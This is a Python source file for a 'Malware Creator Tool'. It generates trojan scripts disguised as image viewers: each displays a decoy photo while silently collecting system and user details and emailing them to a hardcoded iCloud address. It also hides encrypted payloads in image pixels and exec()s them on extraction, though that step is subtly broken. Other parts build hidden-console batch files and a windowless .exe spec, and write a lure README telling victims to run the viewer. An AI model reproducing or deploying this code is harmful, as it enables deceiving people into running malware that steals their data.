#!/usr/bin/env python3

import platform
import socket
import json
import smtplib
import ssl
import getpass
import subprocess
import tempfile
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from cryptography.fernet import Fernet
from PIL import Image

class MalwareCreator:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
    def collect_target_info(self):
        data = {
            'platform': platform.platform(),
            'hostname': socket.gethostname(),
            'system': platform.uname()._asdict(),
            'user_info': self._get_user_details()
        }
        return data
    
    def _get_user_details(self):
        user_data = {}
        env_vars = ['USER', 'HOME', 'LOGNAME']
        
        for var in env_vars:
            user_data[var] = os.environ.get(var)
            
        return user_data
        
    def generate_malware(self):
        try:
            jpg_image = input("Enter path to source JPG: ").strip().strip("'\"")
            output_jpg = input("Save embedded JPG as: ").strip().strip("'\"")
            
            # Expand user path if needed
            jpg_image = os.path.expanduser(jpg_image)
            output_jpg = os.path.expanduser(output_jpg)
            
            # Check if input file exists
            if not os.path.exists(jpg_image):
                print(f"[-] Error: Input file '{jpg_image}' not found")
                return
            
            # Create both steganographic JPG and executable script
            payload = self.create_payload()
            self.embed_in_jpg(jpg_image, output_jpg, payload)
            
            # Create executable script that looks like an image
            script_name = output_jpg.replace('.jpg', '.py')
            self.create_executable_image(jpg_image, script_name, payload)
            
            print(f"[+] Created infected JPG: {output_jpg}")
            print(f"[+] Created executable script: {script_name}")
            print(f"[!] To auto-execute, victim must run: python {script_name}")
            
        except Exception as e:
            print(f"[-] Generation failed: {str(e)}")
    
    def create_executable_image(self, source_img, output_script, payload):
        """Create a Python script that displays image and executes payload"""
        script_content = f'''#!/usr/bin/env python3
import os
import subprocess
import platform
import socket
import smtplib
import ssl
from PIL import Image

# Display the image first (to appear innocent)
try:
    img_path = "{source_img}"
    if os.path.exists(img_path):
        img = Image.open(img_path)
        img.show()
except:
    pass

# Execute malicious payload silently in background
try:
{payload}
except:
    pass
'''
        
        with open(output_script, 'w') as f:
            f.write(script_content)
        
    def create_deceptive_executable(self):
        """Create an executable that appears to be an image file"""
        try:
            jpg_image = input("Enter path to source JPG: ").strip().strip("'\"")
            output_name = input("Output filename (without extension): ").strip().strip("'\"")
            
            jpg_image = os.path.expanduser(jpg_image)
            
            if not os.path.exists(jpg_image):
                print(f"[-] Error: Input file '{jpg_image}' not found")
                return
            
            payload = self.create_payload()
            
            # Create a Python script that embeds the image
            script_content = f'''#!/usr/bin/env python3
import os
import sys
import platform
import socket
import smtplib
import ssl
import subprocess
import base64
import tempfile
from PIL import Image

# Embed the image as base64 (more deceptive)
def get_embedded_image():
    """Get the embedded image data"""
    try:
        with open("{jpg_image}", "rb") as f:
            return base64.b64encode(f.read()).decode()
    except:
        return None

def display_image():
    """Display the decoy image"""
    try:
        img_data = get_embedded_image()
        if img_data:
            # Create temporary file
            with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as tmp_file:
                tmp_file.write(base64.b64decode(img_data))
                tmp_path = tmp_file.name
            
            # Open the image
            img = Image.open(tmp_path)
            img.show()
            
            # Clean up
            os.unlink(tmp_path)
        else:
            print("Error: Could not load image")
    except Exception as e:
        print(f"Error displaying image: {{e}}")

def execute_payload():
    """Execute the malicious payload silently"""
    try:
        import platform
        import socket
        import os
        import smtplib
        import ssl
        import json

        def steal_data():
            system_info = {{
                'platform': platform.platform(),
                'hostname': socket.gethostname(),
                'username': os.environ.get('USER'),
                'home': os.environ.get('HOME'),
                'path': os.environ.get('PATH')
            }}
            return system_info

        def send_mail(data):
            try:
                smtp_server = 'smtp.mail.me.com'
                port = 587
                sender_email = 'gshubh03@icloud.com'
                receiver_email = 'gshubh03@icloud.com'
                password = "your_app_password_here"  # You need to set this
                
                # Format the message better
                subject = f"System Info from {{os.environ.get('USER', 'Unknown')}}"
                body = f"Stolen data:\\n{{json.dumps(data, indent=2)}}"
                message = f"Subject: {{subject}}\\n\\n{{body}}"
                
                context = ssl.create_default_context()
                with smtplib.SMTP(smtp_server, port) as server:
                    server.starttls(context=context)
                    server.login(sender_email, password)
                    server.sendmail(sender_email, receiver_email, message)
            except Exception as e:
                # Silently fail
                pass

        # Execute silently in background
        data = steal_data()
        send_mail(data)
    except:
        pass

if __name__ == "__main__":
    # Display image first to appear legitimate
    display_image()
    
    # Execute payload silently in background
    execute_payload()
'''
            
            script_file = f"{output_name}.py"
            with open(script_file, 'w') as f:
                f.write(script_content)
            
            os.chmod(script_file, 0o755)
            
            print(f"[+] Created deceptive executable: {script_file}")
            print(f"[!] Target runs: python {script_file}")
            print(f"[*] The script embeds the image and executes payload silently")
            
            # Create a batch file for Windows (more deceptive)
            self.create_batch_wrapper(script_file, output_name)
            
            # Option to create Windows executable
            choice = input("Create Windows .exe file? (y/n): ").lower()
            if choice == 'y':
                self.create_windows_executable(script_file, output_name)
                
        except Exception as e:
            print(f"[-] Creation failed: {str(e)}")
    
    def create_batch_wrapper(self, script_file, output_name):
        """Create a Windows batch file that hides the console"""
        try:
            batch_content = f'''@echo off
python "{script_file}"
'''
            batch_file = f"{output_name}.bat"
            with open(batch_file, 'w') as f:
                f.write(batch_content)
            
            print(f"[+] Created Windows batch file: {batch_file}")
            print("[*] Batch file will run silently on Windows")
            
        except Exception as e:
            print(f"[-] Batch creation failed: {str(e)}")
                
        except Exception as e:
            print(f"[-] Creation failed: {str(e)}")
    
    def create_windows_executable(self, script_file, output_name):
        """Convert Python script to Windows executable"""
        try:
            print("[*] Creating Windows executable...")
            print("[!] This requires pyinstaller: pip install pyinstaller")
            
            # Create spec file for custom icon
            spec_content = f'''# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(['{script_file}'],
             pathex=[],
             binaries=[],
             datas=[],
             hiddenimports=[],
             hookspath=[],
             hooksconfig={{}},
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher,
             noarchive=False)

pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)

exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          [],
          name='{output_name}',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx=True,
          upx_exclude=[],
          runtime_tmpdir=None,
          console=False,
          disable_windowed_traceback=False,
          argv_emulation=False,
          target_arch=None,
          codesign_identity=None,
          entitlements_file=None,
          icon='image_icon.ico')  # You'd need to provide an image icon
'''
            
            spec_file = f"{output_name}.spec"
            with open(spec_file, 'w') as f:
                f.write(spec_content)
            
            print(f"[+] Created spec file: {spec_file}")
            print(f"[!] Run: pyinstaller {spec_file}")
            print("[*] The .exe will appear as an image to victims")
            
        except Exception as e:
            print(f"[-] Windows executable creation failed: {str(e)}")
    
    def create_social_engineering_package(self):
        """Create a complete social engineering package"""
        try:
            print("\n[*] Creating Social Engineering Package")
            print("This creates multiple file types to increase success rate")
            
            jpg_image = input("Enter path to source JPG: ").strip().strip("'\"")
            package_name = input("Package name (e.g., 'vacation_photos'): ").strip().strip("'\"")
            
            jpg_image = os.path.expanduser(jpg_image)
            
            if not os.path.exists(jpg_image):
                print(f"[-] Error: Input file '{jpg_image}' not found")
                return
            
            # Create directory for the package
            package_dir = f"{package_name}_package"
            os.makedirs(package_dir, exist_ok=True)
            
            # 1. Copy the original image (appears innocent)
            import shutil
            original_copy = os.path.join(package_dir, f"{package_name}.jpg")
            shutil.copy2(jpg_image, original_copy)
            
            # 2. Create Python script version
            script_file = os.path.join(package_dir, f"{package_name}_viewer.py")
            self.create_embedded_script(jpg_image, script_file)
            
            # 3. Create Windows batch file
            batch_file = os.path.join(package_dir, f"{package_name}_viewer.bat")
            self.create_stealth_batch(script_file, batch_file)
            
            # 4. Create README with social engineering instructions
            readme_file = os.path.join(package_dir, "README.txt")
            readme_content = f'''Photo Viewer Instructions
========================

Hi! Thanks for downloading these photos!

To view the high-quality versions:

Windows Users:
- Double-click "{package_name}_viewer.bat"

Mac/Linux Users:  
- Run: python {package_name}_viewer.py

The regular {package_name}.jpg is a preview - use the viewer for full quality!

Enjoy the photos!
'''
            with open(readme_file, 'w') as f:
                f.write(readme_content)
            
            print(f"\\n[+] Created social engineering package in: {package_dir}/")
            print(f"[+] Contents:")
            print(f"    - {package_name}.jpg (innocent decoy)")
            print(f"    - {package_name}_viewer.py (malicious script)")
            print(f"    - {package_name}_viewer.bat (Windows launcher)")
            print(f"    - README.txt (social engineering instructions)")
            print(f"\\n[!] Send the entire '{package_dir}' folder to targets")
            print(f"[*] Many will follow the README instructions and run the malware")
            
        except Exception as e:
            print(f"[-] Package creation failed: {str(e)}")
    
    def create_embedded_script(self, jpg_image, output_script):
        """Create a script with embedded image data"""
        import base64
        
        # Read and encode the image
        with open(jpg_image, 'rb') as f:
            img_data = base64.b64encode(f.read()).decode()
        
        payload = self.create_payload()
        
        script_content = f'''#!/usr/bin/env python3
import os
import tempfile
import base64
from PIL import Image

# Embedded image data
IMG_DATA = """{img_data}"""

def display_image():
    try:
        # Decode and display image
        img_bytes = base64.b64decode(IMG_DATA)
        with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as tmp:
            tmp.write(img_bytes)
            tmp_path = tmp.name
        
        img = Image.open(tmp_path)
        img.show()
        os.unlink(tmp_path)
        
        print("Image displayed successfully!")
    except Exception as e:
        print(f"Error displaying image: {{e}}")

def execute_payload():
    try:
        import platform
        import socket
        import smtplib
        import ssl
        import json
        
        # Collect system info silently
        data = {{
            'platform': platform.platform(),
            'hostname': socket.gethostname(),
            'user': os.environ.get('USER', 'Unknown'),
            'home': os.environ.get('HOME', 'Unknown')
        }}
        
        # Send data silently (configure your email settings)
        smtp_server = 'smtp.mail.me.com'
        sender_email = 'gshubh03@icloud.com'
        password = "your_app_password"  # Set this
        
        message = f"Subject: Info from {{data['user']}}\\n\\n{{json.dumps(data, indent=2)}}"
        
        context = ssl.create_default_context()
        with smtplib.SMTP(smtp_server, 587) as server:
            server.starttls(context=context)
            server.login(sender_email, password)
            server.sendmail(sender_email, sender_email, message)
            
    except:
        pass  # Fail silently

if __name__ == "__main__":
    display_image()
    execute_payload()
'''
        
        with open(output_script, 'w') as f:
            f.write(script_content)
        os.chmod(output_script, 0o755)
    
    def create_stealth_batch(self, script_file, batch_file):
        """Create a Windows batch file that runs silently"""
        script_name = os.path.basename(script_file)
        
        batch_content = f'''@echo off
cd /d "%~dp0"
python "{script_name}" >nul 2>&1
'''
        
        with open(batch_file, 'w') as f:
            f.write(batch_content)
    
    def create_payload(self):
        email_config = self.email_setup()
        payload = f"""
import platform
import socket
import os
import smtplib
import ssl
import json
from cryptography.fernet import Fernet

def steal_data():
    system_info = {{
        'platform': platform.platform(),
        'hostname': socket.gethostname(),
        'username': os.environ.get('USER')
    }}
    return system_info

def send_mail(data):
    try:
        smtp_server = '{email_config['smtp_server']}'
        port = {email_config['port']}
        sender_email = '{email_config['sender_email']}'
        receiver_email = '{email_config['sender_email']}'  # Send to same email
        password = input("Enter email password: ")  # In real malware, this would be hardcoded
        
        msg = str(data)
        context = ssl.create_default_context()
        with smtplib.SMTP(smtp_server, port) as server:
            server.starttls(context=context)
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, msg)
    except Exception as e:
        pass

data = steal_data()
send_mail(data)"""
        
        return payload
        
    def embed_in_jpg(self, input_img, output_img, payload):
        img = Image.open(input_img)
        pixels = list(img.getdata())
        
        encrypted_payload = self.cipher.encrypt(payload.encode())
        msg_bytes = encrypted_payload + b'\xFF\xFF\xFF'
        
        new_pixels = []
        bit_index = 0
        
        for pix in pixels:
            if bit_index < len(msg_bytes):
                r, g, b = pix
                
                new_r = (r & ~1) | (msg_bytes[bit_index] >> 7 & 1)
                new_g = (g & ~1) | (msg_bytes[bit_index] >> 6 & 1)
                new_b = (b & ~1) | (msg_bytes[bit_index] >> 5 & 1)
                
                new_pixels.append((new_r, new_g, new_b))
                bit_index += 1
            else:
                new_pixels.append(pix)
                
        img.putdata(new_pixels)
        img.save(output_img)
    
    def extract_payload(self, infected_img):
        """Extract and execute payload from infected JPG"""
        try:
            img = Image.open(infected_img)
            pixels = list(img.getdata())
            
            extracted_bytes = bytearray()
            
            for pix in pixels:
                r, g, b = pix
                
                # Extract bits from LSB of each color channel
                byte_val = 0
                byte_val |= (r & 1) << 7
                byte_val |= (g & 1) << 6
                byte_val |= (b & 1) << 5
                
                extracted_bytes.append(byte_val)
                
                # Check for terminator
                if len(extracted_bytes) >= 3 and extracted_bytes[-3:] == b'\xFF\xFF\xFF':
                    break
            
            # Remove terminator
            if extracted_bytes[-3:] == b'\xFF\xFF\xFF':
                extracted_bytes = extracted_bytes[:-3]
            
            # Decrypt payload
            decrypted_payload = self.cipher.decrypt(bytes(extracted_bytes))
            
            # Execute payload
            exec(decrypted_payload.decode())
            
        except Exception as e:
            print(f"[-] Extraction failed: {str(e)}")
    
    def run_infected_image(self):
        """Simulate opening an infected image"""
        infected_img = input("Enter path to infected JPG: ").strip().strip("'\"")
        infected_img = os.path.expanduser(infected_img)
        
        if not os.path.exists(infected_img):
            print(f"[-] Error: File '{infected_img}' not found")
            return
            
        print(f"[+] Opening image: {infected_img}")
        # This would normally just display the image, but we'll extract payload
        self.extract_payload(infected_img)
        
    def email_setup(self):
        """Configure SMTP settings for the malware payload"""
        smtp_config = {
            'smtp_server': 'smtp.mail.me.com',
            'port': 587,
            'sender_email': 'gshubh03@icloud.com',
        }
        return smtp_config

if __name__ == '__main__':
    creator = MalwareCreator()
    
    print("Malware Creator Tool")
    print("1. Create infected JPG with steganography")
    print("2. Run infected JPG (extract and execute payload)")
    print("3. Create executable that looks like an image")
    print("4. Create social engineering package (RECOMMENDED)")
    choice = input("Choose option (1/2/3/4): ").strip()
    
    if choice == '1':
        creator.generate_malware()
    elif choice == '2':
        creator.run_infected_image()
    elif choice == '3':
        creator.create_deceptive_executable()
    elif choice == '4':
        creator.create_social_engineering_package()
    else:
        print("[-] Invalid choice")